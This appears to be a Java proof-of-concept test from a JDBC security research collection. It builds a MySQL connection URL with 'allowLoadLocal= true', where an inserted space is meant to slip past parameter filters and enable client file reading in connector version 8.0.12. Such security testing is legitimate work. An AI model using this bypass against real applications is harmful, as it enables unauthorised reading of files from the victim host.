package com.jdbc.tricks.space_between;

import com.jdbc.tricks.utils.MysqlConnectionUtils;

/**
 * 测试allowLoadLocal参数键值间添加空格(" true")绕过的文件读取漏洞
 * 驱动版本：mysql-connector-java 8.0.12
 */
public class AllowLoadLocal_SpaceBetweenKeyValueBypass {

    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3306/test?allowLoadLocal= true";
        MysqlConnectionUtils.connect(url, "root", "root",true);
    }
}